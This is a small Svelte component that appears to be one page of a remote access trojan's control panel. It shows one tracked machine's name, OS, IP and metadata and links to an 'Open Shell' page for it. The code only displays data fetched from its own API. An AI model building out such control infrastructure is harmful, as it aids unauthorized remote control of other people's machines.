<script lang="ts">
	import { page } from '$app/stores';
	import { onMount } from 'svelte';
	import type { Rat } from '$lib/types';

	let rat: Rat | null = null;

	onMount(async () => {
		const res = await fetch(`/api/seekers`);
        if (!res.ok) {
			console.error('Fetch error:', res.status, res.statusText);
			return;
		}
		const rats: Record<string, Rat> = await res.json();
		rat = rats[$page.params.id] ?? null;
	});
</script>

{#if rat}
	<div class="p-4 bg-gray-800 rounded">
		<h2 class="text-2xl mb-4">{rat.name}</h2>
		<p><strong>ID:</strong> {rat.id}</p>
		<p><strong>OS:</strong> {rat.os}</p>
		<p><strong>IP:</strong> {rat.ip}</p>
		<div class="mt-4">
			<a href="/{rat.id}/shell" class="px-4 py-2 bg-blue-600 rounded hover:bg-blue-500">Open Shell</a>
		</div>
		<h3 class="mt-4 text-xl">Metadata</h3>
		<pre class="bg-gray-900 p-4 rounded">{JSON.stringify(rat.metadata, null, 2)}</pre>
	</div>
{:else}
	<p>Rat not found.</p>
{/if}